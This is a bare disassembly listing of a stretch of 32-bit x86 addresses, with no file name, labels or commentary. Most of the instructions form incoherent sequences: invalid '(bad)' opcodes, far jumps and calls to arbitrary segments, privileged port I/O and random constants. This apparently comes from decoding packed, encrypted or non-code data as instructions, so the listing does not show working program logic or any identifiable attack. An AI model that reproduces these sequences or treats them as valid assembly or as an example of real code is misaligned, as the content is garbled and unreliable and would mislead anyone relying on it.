  412e9a:	sahf   
  412e9b:	pop    ecx
  412e9c:	push   ss
  412e9d:	xchg   BYTE PTR [eax-0x6ce1cdbd],al
  412ea3:	and    ah,BYTE PTR [edx+0x13]
  412ea6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ea7:	lods   eax,DWORD PTR gs:[esi]
  412ea9:	mov    ebp,0xcc6ac15e
  412eae:	xor    DWORD PTR [edi],esp
  412eb0:	mov    edi,0x73e7485f
  412eb5:	loope  0x412ef8
  412eb7:	add    BYTE PTR [edi+0x19],ah
  412eba:	cs into 
  412ebc:	push   eax
  412ebd:	inc    edx
  412ebe:	loope  0x412ede
  412ec0:	xor    esp,DWORD PTR [ebp-0x5b4c603e]
  412ec6:	cmp    DWORD PTR [edx+0x6b],ebx
  412ec9:	xor    esp,edx
  412ecb:	mov    dl,0x6d
  412ecd:	pop    ebp
  412ece:	stc    
  412ecf:	jbe    0x412e79
  412ed1:	pop    edi
  412ed2:	add    al,0xcb
  412ed4:	mov    edx,DWORD PTR [edi+0x68]
  412ed7:	fld1   
  412ed9:	dec    dx
  412edb:	xor    esp,DWORD PTR [esi+0x5a5249d1]
  412ee1:	push   0xffffff83
  412ee3:	cwde   
  412ee4:	imul   edx,DWORD PTR [esi],0x4e
  412ee7:	or     ah,BYTE PTR [esi]
  412ee9:	ss push ecx
  412eeb:	push   ebp
  412eec:	idiv   bx
  412eef:	das    
  412ef0:	mov    DWORD PTR [ebx+0x3da71106],eax
  412ef6:	xchg   edi,eax
  412ef7:	inc    ebx
  412ef8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ef9:	in     eax,0xd9
  412efb:	add    al,0x4e
  412efd:	(bad)  
  412efe:	loopne 0x412f2c
  412f00:	pop    ss
  412f01:	fmulp  st(6),st
  412f03:	retf   0x740c
  412f06:	and    esi,edx
  412f08:	push   0x931d8340
  412f0d:	push   ds
  412f0e:	fild   WORD PTR ds:0x4bd783ca
  412f14:	dec    ebx
  412f15:	xchg   DWORD PTR [ebx+0xc31b437],edx
  412f1b:	and    BYTE PTR [edx+esi*1],bh
  412f1e:	fstp   QWORD PTR [edi-0x68e8677b]
  412f24:	jmp    0x7e6e:0xc97affec
  412f2b:	inc    ecx
  412f2c:	stc    
  412f2d:	lock loopne 0x412f12
  412f30:	push   esi
  412f31:	xchg   edi,eax
  412f32:	leave  
  412f33:	jno    0x412f00
  412f35:	icebp  
  412f36:	push   0xe
  412f38:	shl    DWORD PTR [edx-0x365db0e3],1
  412f3e:	call   0xe9ed:0xcec48fd7
  412f45:	sub    al,0xc2
  412f47:	es cwde 
  412f49:	add    eax,0xec0bab9
  412f4e:	daa    
  412f4f:	jmp    0xec1e:0xa915276b
  412f56:	mov    ebx,0x9f90412e
  412f5b:	aad    0x82
  412f5d:	xor    BYTE PTR [ecx+0x728490f1],ah
  412f63:	xor    bh,dh
  412f65:	jns    0x412fe0
  412f67:	inc    ecx
  412f68:	in     al,dx
  412f69:	cli    
  412f6a:	xor    al,0xcf
  412f6c:	jnp    0x412f61
  412f6e:	ror    esp,cl
  412f70:	nop
  412f71:	addr16 cld 
  412f73:	xchg   edi,eax
  412f74:	mov    eax,ds:0x584a88e4
  412f79:	jae    0x412f33
  412f7b:	jmp    FWORD PTR [ecx]
  412f7d:	jns    0x412fe3
  412f7f:	or     bl,cl
  412f81:	sub    DWORD PTR [edx+edx*1-0x66],esp
  412f85:	cs jnp 0x412f5d
  412f88:	les    ebp,FWORD PTR [esi]
  412f8a:	ins    DWORD PTR es:[edi],dx
  412f8b:	getsec 
  412f8d:	add    al,0x30
  412f8f:	jg     0x412f9d
  412f91:	stos   BYTE PTR es:[edi],al
  412f92:	pop    ecx
  412f93:	call   0xf9d1:0xd2832407
  412f9a:	dec    ecx
  412f9b:	ds sbb al,0xd9
  412f9e:	mov    dh,0x35
  412fa0:	mov    edx,0x248f6e0d
  412fa5:	fcmovbe st,st(7)
  412fa7:	ins    DWORD PTR es:[edi],dx
  412fa8:	dec    ecx
  412fa9:	ret    
  412faa:	mov    ecx,0xe21a0c37
  412faf:	inc    edx
  412fb0:	and    DWORD PTR [edx],esi
  412fb2:	in     eax,dx
  412fb3:	jb     0x413032
  412fb5:	stos   BYTE PTR es:[edi],al
  412fb6:	sar    ch,cl
  412fb8:	mov    ecx,0x203f553a
  412fbd:	or     cl,BYTE PTR ds:0xa3a1aa6a
  412fc3:	stos   DWORD PTR es:[edi],eax
  412fc4:	loopne 0x413001
  412fc6:	mov    WORD PTR ds:0x9297b781,fs
  412fcc:	jge    0x413042
  412fce:	inc    ebp
  412fcf:	(bad)  
  412fd0:	cmp    DWORD PTR ds:0x8b3690b0,ebx
  412fd6:	jbe    0x413055
  412fd8:	sub    ecx,esp
  412fda:	fstp   DWORD PTR [edi+0x985df97]
  412fe0:	pop    ds
  412fe1:	dec    ebp
  412fe2:	scas   al,BYTE PTR es:[edi]
  412fe3:	push   ds
  412fe4:	fld    TBYTE PTR [edx+0x28]
  412fe7:	xor    DWORD PTR [eax+0xe],esp
  412fea:	call   0x84b5:0xf72b8518
  412ff1:	adc    edi,0x79
  412ff4:	pop    eax
  412ff5:	repz je 0x41303b
  412ff8:	lock xchg ebx,eax
  412ffa:	pop    edx
  412ffb:	std    
  412ffc:	xor    al,0x1b
  412ffe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412fff:	mov    WORD PTR ss:[esp+edi*8],ss
  413003:	jmp    0x162b:0xedc8bdc7
  41300a:	pop    ecx
  41300b:	dec    eax
  41300c:	shl    dh,1
  41300e:	push   ebp
  41300f:	inc    edi
  413010:	data16 adc ch,BYTE PTR [edx-0x1c]
  413014:	and    DWORD PTR [edx+0x2402c484],ecx
  41301a:	aaa    
  41301b:	outs   dx,DWORD PTR ds:[esi]
  41301c:	jo     0x412fb0
  41301e:	pop    edx
  41301f:	icebp  
  413020:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413021:	sbb    dh,BYTE PTR [ebx+0x642e29f1]
  413027:	outs   dx,DWORD PTR ds:[esi]
  413028:	clc    
  413029:	rol    DWORD PTR ds:0xb761c33f,0x3c
  413030:	imul   ebx,DWORD PTR [edi+0x38c07d33],0xb4951890
  41303a:	test   BYTE PTR [edi-0x65228a50],ch
  413040:	sbb    ecx,DWORD PTR [edx-0x20664573]
  413046:	sbb    edi,esp
  413048:	dec    ecx
  413049:	mov    ecx,0xfff6958c
  41304e:	icebp  
  41304f:	inc    esp
  413050:	daa    
  413051:	imul   esi,ebp,0x21
  413054:	neg    BYTE PTR [edx-0x23]
  413057:	std    
  413058:	out    dx,al
  413059:	lock inc esi
  41305b:	cli    
  41305c:	cwde   
  41305d:	dec    edi
  41305e:	push   eax
  41305f:	sbb    ecx,DWORD PTR [ecx-0x58f1a440]
  413065:	mov    esp,0x235b34aa
  41306a:	or     eax,0xdf2cd7e9
  41306f:	push   eax
  413070:	or     BYTE PTR [edi],al
  413072:	in     eax,dx
  413073:	into   
  413074:	cwde   
  413075:	sbb    DWORD PTR [edi],0x69
  413078:	int    0x2b
  41307a:	inc    ebp
  41307b:	pop    esp
  41307c:	jmp    0x5f3d0f55
  413081:	push   es
  413082:	sub    eax,0xb092a9c5
  413087:	mov    edi,0x56513e0c
  41308c:	ss nop
  41308e:	add    ebp,DWORD PTR cs:[edx+0x73]
  413092:	dec    edx
  413093:	dec    ecx
  413094:	cmp    edi,esp
  413096:	mov    bl,0xdd
  413098:	cdq    
  413099:	ret    0xeaa9
  41309c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41309d:	nop
  41309e:	pop    esp
  41309f:	mov    ds:0x1926d8f3,al
  4130a4:	nop
  4130a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130a6:	mov    al,cs:0x3a1c5bf5
  4130ac:	adc    cl,bh
  4130ae:	loop   0x413108
  4130b0:	push   cs
  4130b1:	mov    dh,0xba
  4130b3:	pop    es
  4130b4:	mov    DWORD PTR [esi-0x3d48330b],esi
  4130ba:	sub    ebp,DWORD PTR [ebp-0xe]
  4130bd:	add    DWORD PTR [edi+ecx*8+0x73],eax
  4130c1:	and    ebx,DWORD PTR es:[edi+0x279c8458]
  4130c8:	out    0xb0,al
  4130ca:	sub    BYTE PTR [esp+edi*4+0x7debd00a],0xf7
  4130d2:	leave  
  4130d3:	mov    ecx,0x9ab5895c
  4130d8:	enter  0x2d15,0xb8
  4130dc:	hlt    
  4130dd:	sbb    DWORD PTR [esi-0x4e],eax
  4130e0:	push   ss
  4130e1:	shl    DWORD PTR [esi+0xa],0x86
  4130e5:	sub    eax,0x7e93f493
  4130ea:	mov    ?,WORD PTR [esi-0x16]
  4130ed:	xor    eax,0x365e2dce
  4130f2:	outs   dx,BYTE PTR ds:[esi]
  4130f3:	mov    ch,0xc9
  4130f5:	pop    esp
  4130f6:	shl    cl,0xb9
  4130f9:	ret    
  4130fa:	sbb    bh,BYTE PTR [ebp+0x73]
  4130fd:	test   DWORD PTR [eax-0x3c],0x773c6297
  413104:	lock jge 0x41308d
  413107:	imul   eax,edx,0xa346b6d1
  41310d:	jb     0x4130d2
  41310f:	and    BYTE PTR [ecx],dl
  413111:	inc    ebp
  413112:	mov    eax,0x3a83a947
  413117:	test   DWORD PTR [eax+0x66],ebx
  41311a:	enter  0xb307,0xbe
  41311e:	call   0x7be0a160
  413123:	mov    ebp,ebx
  413125:	sbb    eax,0x3d90347c
  41312a:	rol    edi,0xb0
  41312d:	dec    edi
  41312e:	mov    eax,0x8085219b
  413133:	in     al,dx
  413134:	in     eax,dx
  413135:	dec    ebx
  413136:	xor    DWORD PTR [edi+ebx*4],0xcf122fc
  41313d:	mov    edx,0xdf11eecf
  413142:	mov    ebx,0x445f4b32
  413147:	into   
  413148:	fyl2x  
  41314a:	fcom   QWORD PTR [edi-0x2]
  41314d:	mov    al,ds:0x916d51b7
  413152:	xchg   BYTE PTR [edi],ch
  413154:	(bad)  
  413155:	mov    dh,0x23
  413157:	clc    
  413158:	(bad)  
  413159:	mov    WORD PTR [eax-0x26cf7bf],fs
  41315f:	sbb    esp,DWORD PTR [ecx-0x23d75ae4]
  413165:	retf   
  413166:	xchg   ebp,eax
  413167:	cmc    
  413168:	push   edi
  413169:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41316a:	loop   0x413106
  41316c:	ja     0x413142
  41316e:	jnp    0x413129
  413170:	mov    dl,0x41
  413172:	xor    DWORD PTR [ecx-0x24ce569d],ebp
  413178:	loop   0x413192
  41317a:	sbb    edx,DWORD PTR [edi]
  41317c:	jnp    0x4131a9
  41317e:	repnz (bad) [edi+0x70]
  413182:	push   ss
  413183:	jns    0x41310f
  413185:	lea    ecx,[edi+0x46cee31e]
  41318b:	xchg   ah,dh
  41318d:	push   esp
  41318e:	dec    DWORD PTR [ebp+0x34c50ab]
  413194:	xor    edx,esi
  413196:	in     al,dx
  413197:	inc    ebp
  413198:	xchg   ecx,edx
  41319a:	pop    ds
  41319b:	retf   0x470b
  41319e:	inc    esp
  41319f:	shr    eax,1
  4131a1:	push   eax
  4131a2:	and    DWORD PTR [edi+ecx*8-0x2e],edx
  4131a6:	add    DWORD PTR [esi-0xd],esi
  4131a9:	adc    edi,DWORD PTR [eax-0x4a8e71d5]
  4131af:	popa   
  4131b0:	and    al,0xd1
  4131b2:	pusha  
  4131b3:	hlt    
  4131b4:	popf   
  4131b5:	outs   dx,BYTE PTR ds:[esi]
  4131b6:	fist   DWORD PTR [esi-0x787459b7]
  4131bc:	and    al,0xeb
  4131be:	jle    0x4131ad
  4131c0:	mov    cl,0xdf
  4131c2:	ins    DWORD PTR es:[edi],dx
  4131c3:	push   ds
  4131c4:	mov    WORD PTR [eax+0x2],ss
  4131c7:	mov    edi,0xf031ef94
  4131cc:	push   esp
  4131cd:	(bad)  
  4131d0:	repnz cmp al,0x74
  4131d3:	push   0x74
  4131d5:	ret    0xe254
  4131d8:	int    0x6e
  4131da:	ret    
  4131db:	mov    eax,ds:0xa2db98ca
  4131e0:	stos   BYTE PTR es:[edi],al
  4131e1:	lahf   
  4131e2:	cmp    dl,0x6e
  4131e5:	dec    esi
  4131e6:	stos   DWORD PTR es:[edi],eax
  4131e7:	lods   al,BYTE PTR ds:[esi]
  4131e8:	sub    DWORD PTR [ebx+0x4e],ecx
  4131eb:	movups xmm0,XMMWORD PTR [esi+0x5af78657]
  4131f2:	push   0x543c7648
  4131f7:	(bad)  
  4131f8:	ror    DWORD PTR [edi],cl
  4131fa:	pop    esp
  4131fb:	push   ebx
  4131fc:	xchg   edx,eax
  4131fd:	adc    eax,edx
  4131ff:	jge    0x41319a
  413201:	iret   
  413202:	jae    0x413242
  413204:	mov    ebx,0xb689019f
  413209:	mov    edi,gs
  41320b:	sub    BYTE PTR [eax-0x7a],al
  41320e:	enter  0xd513,0x33
  413212:	xor    eax,0x295985c8
  413217:	cmc    
  413218:	mov    eax,0x3ff4b477
  41321d:	add    BYTE PTR [edi+ebp*4],ah
  413220:	fisttp WORD PTR [eax-0x713dca7]
  413226:	xor    DWORD PTR [ebp-0x47],esi
  413229:	jns    0x413251
  41322b:	cmp    eax,0xee1fc7bf
  413230:	adc    al,0x8c
  413232:	xchg   ebx,eax
  413233:	pop    esp
  413234:	pop    es
  413235:	mov    DWORD PTR [ebx+ebp*2-0x11c5d588],0xab5dc6fc
  413240:	jmp    0x7d3a:0xb828d58c
  413247:	call   0x3853eff6
  41324c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41324d:	xor    ebx,DWORD PTR [esi]
  41324f:	mov    ebp,gs
  413251:	mov    al,ds:0x543535f2
  413256:	mov    ds:0xf6396cff,al
  41325b:	loopne 0x41324f
  41325d:	mov    dh,0x8f
  41325f:	ins    DWORD PTR es:[edi],dx
  413260:	les    esi,FWORD PTR [ebx+0x61abb4af]
  413266:	cmp    eax,DWORD PTR ds:0xcd65361e
  41326c:	rcl    ch,cl
  41326e:	dec    esp
  41326f:	pop    ss
  413270:	sbb    al,0x6f
  413272:	fistp  DWORD PTR [ecx+0x749346f9]
  413278:	out    0xbc,eax
  41327a:	daa    
  41327b:	bound  ebp,QWORD PTR [edx+0x19]
  41327e:	sbb    esp,ecx
  413280:	jmp    0x691ebb34
  413285:	retw   0x20cc
  413289:	out    dx,al
  41328a:	outs   dx,BYTE PTR ds:[esi]
  41328b:	iret   
  41328c:	pop    ebp
  41328d:	add    ah,BYTE PTR [esi]
  41328f:	fldenv [ebp+0x122508f6]
  413295:	shl    DWORD PTR [ebp+0x5ab8e869],0x28
  41329c:	sub    dh,BYTE PTR [esi+eax*1-0x7d9578b5]
  4132a3:	mov    edx,0x86368596
  4132a8:	adc    DWORD PTR [eax+eax*2-0x60],esi
  4132ac:	sbb    DWORD PTR [eax-0x19],edi
  4132af:	js     0x413306
  4132b1:	mov    ecx,edx
  4132b3:	xchg   ebp,eax
  4132b4:	and    esi,ecx
  4132b6:	dec    ecx
  4132b7:	cmp    al,BYTE PTR [esi]
  4132b9:	test   al,0x94
  4132bb:	dec    ebx
  4132bc:	inc    edx
  4132bd:	push   0x7ea45543
  4132c2:	test   DWORD PTR [ebx-0x48e91bd5],edx
  4132c8:	leave  
  4132c9:	inc    esp
  4132ca:	push   edx
  4132cb:	out    dx,eax
  4132cc:	pushf  
  4132cd:	mov    bh,BYTE PTR [ecx-0x4]
  4132d0:	test   BYTE PTR ds:[ebx+0x1d432bed],ch
  4132d7:	push   ds
  4132d8:	jmp    0xc57b:0xe550284
  4132df:	mov    ch,BYTE PTR ds:0x64b8f6f3
  4132e5:	shr    DWORD PTR [eax],0xa1
  4132e8:	sbb    eax,0x8a00e4c7
  4132ed:	stc    
  4132ee:	sbb    DWORD PTR ds:0x3caac303,edx
  4132f4:	call   0x15aeae19
  4132f9:	inc    ecx
  4132fa:	sbb    al,0x36
  4132fc:	imul   esi,DWORD PTR [ecx+0x24],0xc94d9b2f
  413303:	pop    edx
  413304:	and    BYTE PTR [ebp-0x53e70aa1],bl
  41330a:	call   0xb460978d
  41330f:	in     al,0xb8
  413311:	out    dx,al
  413312:	push   ebp
  413313:	add    DWORD PTR ss:[ebp-0x4ed5c616],ebp
  41331a:	popf   
  41331b:	cmp    dh,BYTE PTR [ebx]
  41331d:	int3   
  41331e:	xor    BYTE PTR [ecx],ch
  413320:	lahf   
  413321:	mov    al,ds:0x1734560f
  413326:	and    ecx,DWORD PTR [edi+0x4a]
  413329:	in     al,dx
  41332a:	(bad)  
  41332b:	je     0x41337f
  41332d:	cmp    DWORD PTR [ebp-0x17],ecx
  413330:	xor    eax,0x91362da8
  413335:	xchg   edx,eax
  413336:	icebp  
  413337:	jmp    0x413388
  413339:	sbb    eax,DWORD PTR [ebx+0x7c203ed4]
  41333f:	scas   eax,DWORD PTR es:[edi]
  413340:	int3   
  413341:	imul   esp,DWORD PTR [esi],0xffffffab
  413344:	pusha  
  413345:	pop    es
  413346:	mov    ebx,0xbaf22f20
  41334b:	test   al,0x39
  41334d:	xor    edx,edx
  41334f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413350:	sub    ecx,DWORD PTR ds:0x6a7d8dad
  413356:	xor    bl,BYTE PTR [ecx]
  413358:	mov    esp,ebp
  41335a:	fcomp  QWORD PTR [ebp-0x7c]
  41335d:	inc    ebx
  41335e:	pop    es
  41335f:	outs   dx,BYTE PTR ds:[esi]
  413360:	push   edx
  413361:	pop    ebp
  413362:	xor    DWORD PTR [ebx-0x4500fa3b],ebp
  413368:	mov    esi,0x4c36ceb6
  41336d:	repz jmp 0x413301
  413370:	mov    ecx,0xc7246ebf
  413375:	stos   DWORD PTR es:[edi],eax
  413376:	loope  0x413339
  413378:	jg     0x4133b7
  41337a:	push   ds
  41337b:	cmp    DWORD PTR [edx+0x5d8615b2],ebp
  413381:	sahf   
  413382:	push   ds
  413383:	aas    
  413384:	pop    eax
  413385:	ret    
  413386:	add    edx,esp
  413388:	jb     0x413360
  41338a:	aad    0xca
  41338c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41338d:	popf   
  41338e:	lock (bad) 
  413390:	sbb    al,0x2f
  413392:	mov    dh,0xec
  413394:	dec    edx
  413395:	mov    WORD PTR es:[eax],cs
  413398:	pop    esp
  413399:	and    al,0x5c
  41339b:	(bad)  
  41339c:	std    
  41339d:	sub    BYTE PTR [edi],cl
  41339f:	pop    ecx
  4133a0:	icebp  
  4133a1:	xor    ebx,DWORD PTR [esi+0x25]
  4133a4:	shl    BYTE PTR [ebx-0x7b713b6c],0x6c
  4133ab:	(bad)  
  4133ac:	stc    
  4133ad:	test   dh,0xb1
  4133b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4133b1:	mov    cl,0xa
  4133b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133b4:	ss jmp 0xc3d32337
  4133ba:	pushf  
  4133bb:	sub    DWORD PTR gs:[ecx],ecx
  4133be:	sbb    ah,BYTE PTR [ecx-0x61]
  4133c1:	and    ah,dl
  4133c3:	ins    DWORD PTR es:[edi],dx
  4133c4:	repnz xchg ecx,eax
  4133c6:	cdq    
  4133c7:	fcomp  QWORD PTR [edi+ecx*8]
  4133ca:	jno    0x4133f3
  4133cc:	mov    ecx,0x275d09df
  4133d1:	test   bl,bh
  4133d3:	jns    0x4133eb
  4133d5:	jne    0x4133be
  4133d7:	jmp    0x4133c9
  4133d9:	xchg   ebp,eax
  4133da:	fs inc ebp
  4133dc:	cld    
  4133dd:	into   
  4133de:	repz loop 0x413446
  4133e1:	sbb    BYTE PTR [eax],bl
  4133e3:	jbe    0x413460
  4133e5:	adc    eax,0x199c5265
  4133ea:	scas   eax,DWORD PTR es:[edi]
  4133eb:	pop    es
  4133ec:	jae    0x41346d
  4133ee:	popf   
  4133ef:	ss (bad) 
  4133f1:	mov    ebp,0xdd23e2d4
  4133f6:	repnz dec edi
  4133f8:	jmp    0x36494300
  4133fd:	mov    ds:0x3286c6a0,al
  413402:	add    eax,0x4ebbb021
  413407:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413408:	(bad)  
  413409:	int3   
  41340a:	xor    ecx,DWORD PTR [edi-0x6d59a199]
  413410:	fistp  DWORD PTR [edi-0x69117389]
  413416:	(bad)  
  413417:	test   eax,0xf547ea08
  41341c:	xchg   esp,eax
  41341d:	add    al,BYTE PTR [ebx+0x64e3103e]
  413423:	imul   eax,DWORD PTR [esi-0x364975d4],0xcf8be54f
  41342d:	mov    WORD PTR [ebx+0x20546f22],gs
  413433:	mov    ah,0x41
  413435:	push   esp
  413436:	push   0xffffff8e
  413438:	(bad)  
  413439:	xchg   edi,eax
  41343a:	push   ebx
  41343b:	or     dh,BYTE PTR [ecx]
  41343d:	jo     0x413474
  41343f:	inc    eax
  413440:	xchg   ebx,eax
  413441:	aas    
  413442:	pop    esi
  413443:	mul    al
  413445:	xchg   esp,eax
  413446:	shr    DWORD PTR [edx+0x70],cl
  413449:	fisub  DWORD PTR [ebx]
  41344b:	pop    es
  41344c:	adc    ebp,DWORD PTR [esp+ebx*4+0x741a62b4]
  413453:	into   
  413454:	ds xchg edi,eax
  413456:	shl    dl,0x20
  413459:	and    al,0xce
  41345b:	adc    al,0xa5
  41345d:	cmc    
  41345e:	test   BYTE PTR [ebx-0x7a2305e5],0x11
  413465:	(bad)  
  413466:	div    DWORD PTR [edx-0x35]
  413469:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41346a:	cmp    ebp,DWORD PTR [edi+edi*1+0x25cfda0e]
  413471:	(bad)  
  413472:	cwde   
  413473:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413474:	cwde   
  413475:	xchg   DWORD PTR [ebp-0x6d],edi
  413478:	jp     0x413495
  41347a:	bnd jnp 0x41344f
  41347d:	sti    
  41347e:	popa   
  41347f:	cmp    BYTE PTR [esi-0x38],dl
  413482:	xchg   edx,eax
  413483:	pop    edi
  413484:	add    al,0xa0
  413486:	jl     0x41341d
  413488:	add    DWORD PTR [edi+0x45],eax
  41348b:	mov    ebx,0xc6e34f71
  413490:	jge    0x41347c
  413492:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413493:	push   edx
  413494:	cmp    ah,BYTE PTR [esi]
  413496:	xrelease xchg DWORD PTR [ebx+0x1f],eax
  41349a:	std    
  41349b:	adc    eax,0x7929fd2c
  4134a0:	js     0x4134a0
  4134a2:	or     al,0xc1
  4134a4:	sub    bh,BYTE PTR [edx-0x648a823b]
  4134aa:	dec    edi
  4134ab:	in     al,dx
  4134ac:	jo     0x4134a3
  4134ae:	call   0xa36b3474
  4134b3:	dec    ebp
  4134b4:	fld    st(0)
  4134b6:	retf   0x5831
  4134b9:	mov    dh,0x86
  4134bb:	imul   esi,ebx,0x3f9c27ce
  4134c1:	icebp  
  4134c2:	dec    ebx
  4134c3:	(bad)  
  4134c4:	mov    bl,0xf9
  4134c6:	jmp    edi
  4134c8:	pushf  
  4134c9:	dec    BYTE PTR [esi]
  4134cb:	mov    ah,BYTE PTR [edx+0x1d4829b5]
  4134d1:	frstor [eax+0x198faccb]
  4134d7:	add    al,0xd
  4134d9:	aam    0x93
  4134db:	popa   
  4134dc:	or     al,BYTE PTR [edi-0x5b]
  4134df:	ret    
  4134e0:	xchg   edx,eax
  4134e1:	out    0xae,al
  4134e3:	in     eax,0x2a
  4134e5:	jmp    0x54fa9275
  4134ea:	mov    dl,0xed
  4134ec:	dec    esi
  4134ed:	sbb    DWORD PTR [eax-0x3b],0x1495967e
  4134f4:	push   ecx
  4134f5:	outs   dx,BYTE PTR ds:[esi]
  4134f6:	fcom   QWORD PTR [ecx-0x80]
  4134f9:	aad    0xce
  4134fb:	xchg   esp,eax
  4134fc:	xor    dl,dl
  4134fe:	xchg   ebp,eax
  4134ff:	or     eax,DWORD PTR [edi]
  413501:	outs   dx,BYTE PTR ds:[esi]
  413502:	(bad)  
  413503:	jmp    0x413551
  413505:	sbb    eax,0x127ae21f
  41350a:	jne    0x4134fd
  41350c:	test   eax,0x7433d4db
  413511:	pusha  
  413512:	push   0x9024c428
  413517:	dec    esi
  413518:	pop    edx
  413519:	or     ebx,edx
  41351b:	mov    DWORD PTR [eax+0x13],esi
  41351e:	inc    ecx
  41351f:	xor    eax,DWORD PTR [edx-0x4ab0225a]
  413525:	gs iret 
  413527:	xor    eax,0x8a4da428
  41352c:	mov    BYTE PTR [edi],al
  41352e:	inc    ebx
  41352f:	and    ch,0x45
  413532:	jne    0x413589
  413534:	daa    
  413535:	add    BYTE PTR [ebx+0x7a],0xfb
  413539:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41353a:	inc    ebp
  41353b:	in     al,dx
  41353c:	push   es
  41353d:	clc    
  41353e:	cmp    eax,0x5b5a6479
  413543:	pop    edi
  413544:	mov    dh,0xce
  413546:	sti    
  413547:	pop    es
  413548:	test   al,0x68
  41354a:	jl     0x413540
  41354c:	cmp    eax,DWORD PTR [eax]
  41354e:	pushf  
  41354f:	mov    DWORD PTR [ebx-0x4f4bf20],edx
  413555:	jg     0x413565
  413557:	or     eax,0xa417baa1
  41355c:	js     0x41351b
  41355e:	xchg   esp,eax
  41355f:	dec    edx
  413560:	add    DWORD PTR [edi-0x57],ebp
  413563:	push   edx
  413564:	popf   
  413565:	mov    ebx,DWORD PTR [eax+0x77]
  413568:	jle    0x41358a
  41356a:	popa   
  41356b:	mov    cl,BYTE PTR [eax-0x4e968770]
  413571:	xor    al,ch
  413573:	pop    ss
  413574:	jo     0x4135d7
  413576:	sub    dh,bl
  413578:	xor    BYTE PTR ds:0x4f50c0d9,ah
  41357e:	leave  
  41357f:	stc    
  413580:	cmp    DWORD PTR [ecx-0x2b],edx
  413583:	push   es
  413584:	jecxz  0x4135b0
  413586:	mov    edx,0xbe50103c
  41358b:	and    eax,0x79c7c421
  413590:	bound  esp,QWORD PTR [ebp+0x5e]
  413593:	push   edi
  413594:	dec    edi
  413595:	loop   0x4135a8
  413597:	mov    eax,0x8a08e748
  41359c:	pop    edi
  41359d:	xchg   ecx,eax
  41359e:	test   BYTE PTR [esi+ecx*1-0x7df924cc],ah
  4135a5:	shl    BYTE PTR [eax-0x4a],0x78
  4135a9:	js     0x4135e1
  4135ab:	add    eax,0xe61cd4ba
  4135b0:	adc    edi,edx
  4135b2:	jne    0x413624
  4135b4:	scas   al,BYTE PTR es:[edi]
  4135b5:	retf   
  4135b6:	data16 gs gs jg 0x413580
  4135bb:	jmp    0x41360c
  4135bd:	dec    edi
  4135be:	sub    BYTE PTR [ecx],0x40
  4135c1:	add    cl,bh
  4135c3:	cmp    edx,DWORD PTR [edx+ebx*4-0x44]
  4135c7:	push   esp
  4135c8:	pop    ds
  4135c9:	sub    DWORD PTR [esp+eiz*4],edx
  4135cc:	jmp    0xfd17:0x4c2df798
  4135d3:	sbb    ecx,DWORD PTR [esi+ebx*8]
  4135d6:	jmp    0x48c07f32
  4135db:	and    DWORD PTR [ecx],0x2c472a64
  4135e1:	adc    ebp,DWORD PTR [eax+ebp*8-0x30]
  4135e5:	push   ss
  4135e6:	add    cl,BYTE PTR [esi-0x39]
  4135e9:	jbe    0x413634
  4135eb:	aaa    
  4135ec:	jne    0x41358c
  4135ee:	push   0x2c
  4135f0:	jl     0x4135f0
  4135f2:	and    al,0xac
  4135f4:	popa   
  4135f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4135f6:	div    DWORD PTR [eax+0x54f7cc8]
  4135fc:	push   es
  4135fd:	adc    al,0xcd
  4135ff:	mov    esi,0xd97784bf
  413604:	outs   dx,BYTE PTR ds:[esi]
  413605:	stos   DWORD PTR es:[edi],eax
  413606:	inc    esi
  413607:	in     al,0x3a
  413609:	pop    esp
  41360a:	mov    DWORD PTR [ebx+ebx*4+0x10],ebp
  41360e:	dec    eax
  41360f:	mov    ds:0x5fbbef9c,eax
  413614:	mov    al,ds:0x7188a69
  413619:	sub    BYTE PTR [ebx],ah
  41361b:	jecxz  0x4135ca
  41361d:	sub    BYTE PTR [edi+0xb],ch
  413620:	cmp    ebx,esi
  413622:	aaa    
  413623:	fidivr DWORD PTR [ecx+0x38ab9eae]
  413629:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41362a:	jle    0x4135e9
  41362c:	mov    dl,0x83
  41362e:	cld    
  41362f:	mov    dh,0xf3
  413631:	add    BYTE PTR [ecx],dh
  413633:	cwde   
  413634:	(bad)  
  413636:	mov    cs,WORD PTR [edi]
  413638:	xor    eax,0xf47177a2
  41363d:	sbb    ecx,DWORD PTR [ebx]
  41363f:	fwait
  413640:	inc    eax
  413641:	sub    BYTE PTR [edx+0x4d],ah
  413644:	imul   ebx,DWORD PTR [edi+ebx*1+0x24],0x7e422c60
  41364c:	jnp    0x413699
  41364e:	js     0x413623
  413650:	cmp    DWORD PTR [ecx+0x363e1ac4],0xddc5abf4
  41365a:	inc    ebx
  41365b:	out    0xa2,al
  41365d:	fisubr DWORD PTR [edx]
  41365f:	dec    esp
  413660:	xchg   DWORD PTR [edx],edi
  413662:	aam    0x90
  413664:	out    0xeb,eax
  413666:	icebp  
  413667:	mov    edi,0x5ffe565d
  41366c:	retf   
  41366d:	or     al,0x4c
  413670:	std    
  413671:	cmp    bl,BYTE PTR [ebx]
  413673:	pop    ebp
  413674:	cmp    BYTE PTR [edx],bh
  413676:	xchg   BYTE PTR [eax-0x2314b1c8],dh
  41367c:	inc    esi
  41367d:	dec    edi
  41367e:	ins    BYTE PTR es:[edi],dx
  41367f:	enter  0x1393,0x25
  413683:	leave  
  413684:	stos   DWORD PTR es:[edi],eax
  413685:	dec    edx
